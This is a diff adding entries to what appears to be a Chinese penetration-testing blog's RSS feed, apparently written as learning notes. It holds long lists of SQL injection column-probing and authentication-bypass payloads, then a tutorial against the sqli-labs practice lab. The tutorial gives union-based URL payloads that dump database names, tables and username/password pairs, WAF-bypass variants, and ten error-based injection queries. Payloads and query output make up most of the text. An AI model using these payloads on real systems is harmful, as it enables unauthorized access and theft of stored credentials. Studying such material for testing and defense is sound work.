+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;sql-injection-auth-bypass-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-injection-auth-bypass-payloads&#34;&gt;#&lt;/a&gt; SQL Injection Auth Bypass Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&#39;-&#39;
+&#39; &#39;
+&#39;&amp;amp;&#39;
+&#39;^&#39;
+&#39;*&#39;
+&#39; or &#39;&#39;-&#39;
+&#39; or &#39;&#39; &#39;
+&#39; or &#39;&#39;&amp;amp;&#39;
+&#39; or &#39;&#39;^&#39;
+&#39; or &#39;&#39;*&#39;
+&amp;quot;-&amp;quot;
+&amp;quot; &amp;quot;
+&amp;quot;&amp;amp;&amp;quot;
+&amp;quot;^&amp;quot;
+&amp;quot;*&amp;quot;
+&amp;quot; or &amp;quot;&amp;quot;-&amp;quot;
+&amp;quot; or &amp;quot;&amp;quot; &amp;quot;
+&amp;quot; or &amp;quot;&amp;quot;&amp;amp;&amp;quot;
+&amp;quot; or &amp;quot;&amp;quot;^&amp;quot;
+&amp;quot; or &amp;quot;&amp;quot;*&amp;quot;
+or true--
+&amp;quot; or true--
+&#39; or true--
+&amp;quot;) or true--
+&#39;) or true--
+&#39; or &#39;x&#39;=&#39;x
+&#39;) or (&#39;x&#39;)=(&#39;x
+&#39;)) or ((&#39;x&#39;))=((&#39;x
+&amp;quot; or &amp;quot;x&amp;quot;=&amp;quot;x
+&amp;quot;) or (&amp;quot;x&amp;quot;)=(&amp;quot;x
+&amp;quot;)) or ((&amp;quot;x&amp;quot;))=((&amp;quot;x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin&#39; --
+admin&#39; #
+admin&#39;/*
+admin&#39; or &#39;1&#39;=&#39;1
+admin&#39; or &#39;1&#39;=&#39;1&#39;--
+admin&#39; or &#39;1&#39;=&#39;1&#39;#
+admin&#39; or &#39;1&#39;=&#39;1&#39;/*
+admin&#39;or 1=1 or &#39;&#39;=&#39;
+admin&#39; or 1=1
+admin&#39; or 1=1--
+admin&#39; or 1=1#
+admin&#39; or 1=1/*
+admin&#39;) or (&#39;1&#39;=&#39;1
+admin&#39;) or (&#39;1&#39;=&#39;1&#39;--
+admin&#39;) or (&#39;1&#39;=&#39;1&#39;#
+admin&#39;) or (&#39;1&#39;=&#39;1&#39;/*
+admin&#39;) or &#39;1&#39;=&#39;1
+admin&#39;) or &#39;1&#39;=&#39;1&#39;--
+admin&#39;) or &#39;1&#39;=&#39;1&#39;#
+admin&#39;) or &#39;1&#39;=&#39;1&#39;/*
+1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055
+admin&amp;quot; --
+admin&amp;quot; #
+admin&amp;quot;/*
+admin&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1
+admin&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;--
+admin&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;#
+admin&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;/*
+admin&amp;quot;or 1=1 or &amp;quot;&amp;quot;=&amp;quot;
+admin&amp;quot; or 1=1
+admin&amp;quot; or 1=1--
+admin&amp;quot; or 1=1#
+admin&amp;quot; or 1=1/*
+admin&amp;quot;) or (&amp;quot;1&amp;quot;=&amp;quot;1
+admin&amp;quot;) or (&amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;--
+admin&amp;quot;) or (&amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;#
+admin&amp;quot;) or (&amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;/*
+admin&amp;quot;) or &amp;quot;1&amp;quot;=&amp;quot;1
+admin&amp;quot;) or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;--
+admin&amp;quot;) or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;#
+admin&amp;quot;) or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;/*
+1234 &amp;quot; AND 1=0 UNION ALL SELECT &amp;quot;admin&amp;quot;, &amp;quot;81dc9bdb52d04dc20036dbd8313ed055
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;references&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#references&#34;&gt;#&lt;/a&gt; References :&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;SQL Injection ( OWASP )&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9u&#34;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Blind SQL Injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9CbGluZF9TUUxfSW5qZWN0aW9u&#34;&gt;https://www.owasp.org/index.php/Blind_SQL_Injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Testing for SQL Injection (OTG-INPVAL-005)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9TUUxfSW5qZWN0aW9uXyhPVEctSU5QVkFMLTAwNSk=&#34;&gt;https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SQL Injection Bypassing WAF&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9uX0J5cGFzc2luZ19XQUY=&#34;&gt;https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Reviewing Code for SQL Injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9SZXZpZXdpbmdfQ29kZV9mb3JfU1FMX0luamVjdGlvbg==&#34;&gt;https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PL/SQL:SQL Injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QTC9TUUw6U1FMX0luamVjdGlvbg==&#34;&gt;https://www.owasp.org/index.php/PL/SQL:SQL_Injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Testing for NoSQL injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9Ob1NRTF9pbmplY3Rpb24=&#34;&gt;https://www.owasp.org/index.php/Testing_for_NoSQL_injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SQL Injection Injection Prevention Cheat Sheet&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9JbmplY3Rpb25fUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1s&#34;&gt;https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SQL Injection Query Parameterization Cheat Sheet&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9RdWVyeV9QYXJhbWV0ZXJpemF0aW9uX0NoZWF0X1NoZWV0Lmh0bWw=&#34;&gt;https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://or0kit.github.io/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/</guid>
+            <title>再学SQLinjection</title>
+            <link>https://or0kit.github.io/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/</link>
+            <category>sql注入</category>
+            <pubDate>Mon, 07 Dec 2020 11:27:26 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;/images/bimg/%E9%98%BF%E5%B0%94%E7%93%A6%E6%8B%89%E8%BE%9B%EF%BC%8C%E8%A5%BF%E7%8F%AD%E7%89%99.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;接着深入学习 SQL 注入。本文源自某位前辈的笔记，author：404&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;0x00-注入的产生&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-注入的产生&#34;&gt;#&lt;/a&gt; 0x00 注入的产生&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;过滤不严格。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;数据库配置不当。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;转义不当。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;0x01-注入的类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-注入的类型&#34;&gt;#&lt;/a&gt; 0x01 注入的类型&lt;/h1&gt;
+&lt;p&gt;常见的注入我们可以归纳为数字型，字符型，搜索型，盲注等。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select * from admin where id = $id; //数字型 注入
+
+select * from admin where id = &#39;$id&#39;; //字符型
+
+select * from admin where id = &amp;quot;$id&amp;quot;;
+
+select * from admin where id = ($id);
+
+select * from admin where id = (&#39;$id&#39;);
+
+select * from admin where id = (&amp;quot;$id&amp;quot;);
+
+select * from admin where username  like &#39;%adm%&#39;;
+
+select * from admin where username  like (&#39;%adm%&#39;);
+
+select * from admin where id = $id limit 0,1;
+
+select * from admin order by $id;
+
+select * from admin order by limit 0,1 $id;
+
+select * from admin order by id limit 1,1 $id;
+
+insert注入
+
+update注入
+
+delete注入
+
+二次注入
+
+等等
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;实际环境中我们可能还会遇到更为复杂的 sql 注入语句，我们就要想办法闭合它。&lt;/p&gt;
+&lt;h1 id=&#34;0x03-寻找注入的一些注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x03-寻找注入的一些注意&#34;&gt;#&lt;/a&gt; 0x03 寻找注入的一些注意&lt;/h1&gt;
+&lt;p&gt;如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的 fuzz 上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入，&lt;br /&gt;
+但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;当网站为成熟的 cms 框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;判断为自己开发的系统，目标不是很重要可以尝试使用 AWVS 等工具。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;信息收集的重要性，可能它的源码就在 GitHub 上，或者一个备份文件。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;0x00-数据库版本收集与路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-数据库版本收集与路径&#34;&gt;#&lt;/a&gt; 0x00 数据库版本收集与路径&lt;/h1&gt;
+&lt;p&gt;识别数据库版本有助于我们进一步对数据库进行注入我们可以用到  &lt;code&gt;version()&lt;/code&gt;   &lt;code&gt;@@version&lt;/code&gt;   &lt;code&gt;/*!版本号*/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/*!*/&lt;/code&gt;  意为在 xxx 版本之上执行 我的版本是 5.6 所以可以执行&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SELECT * FROM admin WHERE id = 1 union select 1,version(),3;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | admin    | admin    |
+|    1 | 5.6.30-1 | 3        |
++------+----------+----------+
+2 rows in set (0.00 sec)
+
+mysql&amp;gt; SELECT * FROM admin WHERE id = 1 union select 1,@@version,3;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | admin    | admin    |
+|    1 | 5.6.30-1 | 3        |
++------+----------+----------+
+2 rows in set (0.01 sec)
+
+mysql&amp;gt; SELECT * FROM admin WHERE id = 1 union select 1,/*!40000 user()*/,3;
++------+----------------+----------+
+| id   | username       | password |
++------+----------------+----------+
+|    1 | admin          | admin    |
+|    1 | root@localhost | 3        |
++------+----------------+----------+
+2 rows in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;路径的话一般用 &lt;code&gt;@@datadir&lt;/code&gt;  就可以了然后大概反猜下网站路径 操作系统  &lt;code&gt;@@version_compile_os&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x01-用户链接信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-用户链接信息&#34;&gt;#&lt;/a&gt; 0x01 用户，链接信息&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;system_user()&lt;/code&gt;  // 系统用户名&lt;br /&gt;
+ &lt;code&gt;user()&lt;/code&gt;  // 用户名&lt;br /&gt;
+ &lt;code&gt;current_user()&lt;/code&gt;  // 当前用户名&lt;br /&gt;
+ &lt;code&gt;session_user()&lt;/code&gt;  // 链接数据库的用户名&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from users where id =1 union select system_user(),session_user(),current_user();
++--------------------+--------------------+----------+
+| id                 | username           | password |
++--------------------+--------------------+----------+
+| 1                  | Dumb               | Dumb     |
+| root@192.168.1.101 | root@192.168.1.101 | root@%   |
++--------------------+--------------------+----------+
+2 rows in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;读取 host 与 user&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from users where id =1 union select 1,host,user from mysql.user;
++----+-----------+----------+
+| id | username  | password |
++----+-----------+----------+
+|  1 | Dumb      | Dumb     |
+|  1 | %         | root     |
+|  1 | 127.0.0.1 | root     |
+|  1 | ::1       | root     |
+|  1 | localhost | root     |
++----+-----------+----------+
+5 rows in set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x02-文末&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-文末&#34;&gt;#&lt;/a&gt; 0x02 文末&lt;/h1&gt;
+&lt;p&gt;通过以上信息还能大概判断下是不是站库分离之类的&lt;/p&gt;
+&lt;h1 id=&#34;0x00-初识注入-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-初识注入-bypass&#34;&gt;#&lt;/a&gt; 0x00 初识注入 bypass&lt;/h1&gt;
+&lt;p&gt;在 MySQL 里面注入和搭建环境来其实差不多，推荐使用 sqli-labs 来练练手，网上一堆的方法也是我们从学以来用到的&lt;/p&gt;
+&lt;p&gt;加引号 报错  &lt;code&gt;and 1=1&lt;/code&gt;   &lt;code&gt;and 1=2&lt;/code&gt;  然后 SQLmap 一丢有 waf 就凉凉，可能 and 的时候就凉了，所以手工是也算个必修课吧。&lt;/p&gt;
+&lt;p&gt;直接用  &lt;code&gt;and 1=1&lt;/code&gt;  一类的多属于 数字型注入  &lt;code&gt;select * from admin where id = $id;&lt;/code&gt;  被包裹起来的就不行的，所以&lt;br /&gt;
+一般要看报错的语句，当然也不是加个引号没报错就没了，具体分很多情况的。（废话多了点顺便讲清楚吧）&lt;/p&gt;
+&lt;h1 id=&#34;0x01-第一个注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-第一个注入&#34;&gt;#&lt;/a&gt; 0x01 第一个注入&lt;/h1&gt;
+&lt;p&gt;and 是一个逻辑符号 要求两边同时成立，所以 and 这边是什么可以尽情发挥大家的才能 比如 and true=1 ？，为什么要这么写，因为某狗判断的就是 and 这边的字符类型&lt;br /&gt;
+大家可以去了解了解 MySQL 隐式转化。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from users where id = &amp;quot;1&amp;quot; and 1=1;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select * from users where id = &amp;quot;1&amp;quot; and 1=2;
+Empty set (0.00 sec)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;说了这么多我们就拿 sqli-labs 的第一关来演示一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;1.6.1.png&#34; alt=&#34;mysql&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;看到报错语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中 &lt;code&gt;&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;&lt;/code&gt;  最外层的是它出错给你的字符串不用看，所以为 &lt;code&gt;&#39;1&#39;&#39; LIMIT 0,1&lt;/code&gt;  应为我们的单引号没闭合所以造成了出错 同时知道了 它的后面有个  &lt;code&gt;LIMIT 0,1&lt;/code&gt;  所以反推大概的语句为  &lt;code&gt;select x,x from xxx where x=&#39;id&#39; limit 0,1&lt;/code&gt;  看到报错信息我们应该要能反推它的语句，有利于我们进一步注入，下面使用联合注入。&lt;/p&gt;
+&lt;p&gt;首先都是老套路  &lt;code&gt;order by xx&lt;/code&gt;  来判断它的列数，因为  &lt;code&gt;order by&lt;/code&gt;  是根据列来排序的 （排序第几列）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/sqli/Less-1/?id=-2&#39; union select 1,schema_name,3 from information_schema.schemata limit 2,1 -- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过 limit 0,1 来控制前端的显位的数据 (从第 0 条取一条) 如果是过滤逗号 。 想用分页可以使用  &lt;code&gt;1 offset 1&lt;/code&gt;  意思是从第 1 条开始选一条当然还有 join 分页这些都在后面讲了。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/sqli/Less-1/?id=-2&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; -- +
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当然你想直接爆当前的库的表 不妨这样写  &lt;code&gt;table_schema=database()&lt;/code&gt;  为了避免单引号你也可以使用 hex 后的数据  &lt;code&gt;table_schema=0x7365637572697479&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;group_concat()&lt;/code&gt;  函数把表名都聚合起来，更加方便。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/sqli/Less-1/?id=-2&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 -- +
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;爆出字段&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/sqli/Less-1/?id=-2&#39; union select 1,group_concat(username,0x7C,password),3 from users-- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;爆出数据 在  &lt;code&gt;group_concat()&lt;/code&gt;  被过滤的情况下我们可以使用其他的来替换 推荐大家查阅 mysql 函数表&lt;/p&gt;
+&lt;p&gt;当我们使用  &lt;code&gt;information_schema.schemata&lt;/code&gt;  时被拦截了，我们可以这样绕过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+`information_schema`.`schemata `
+information_schema/**/.schemata
+information_schema/*!*/.schemata
+information_schema%0a.schemata
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;也有人遇到过这种情况 users 表被拦截 怎么绕过呢，其实也一样&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;security.users 数据库名 加表名
+
+security.`users`
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;0x00-报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-报错注入&#34;&gt;#&lt;/a&gt; 0x00 报错注入&lt;/h1&gt;
+&lt;p&gt;报错注入在我们不能联合注入的时候也是非常重要的网上给我们提供了很多中报错注入 这里直接引用&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd29jYWxpZXNoZW5tZWd1aS9wLzU5MTc5NjcuaHRtbA==&#34;&gt; https://www.cnblogs.com/wocalieshenmegui/p/5917967.html&lt;/span&gt; 一文了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1.floor()
+
+select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+
+2.extractvalue()
+
+select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+
+
+3.updatexml()
+
+select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
+
+
+4.geometrycollection()
+
+select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+
+
+5.multipoint()
+
+select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
+
+
+6.polygon()
+
+select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
+
+
+7.multipolygon()
+
+select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
+
+
+8.linestring()
+
+select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
+
+
+9.multilinestring()
+
+select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
+
+10.exp()
+
+select * from test where id=1 and exp(~(select * from(select user())a));
+
+&lt;/code&gt;&lt;/pre&gt;
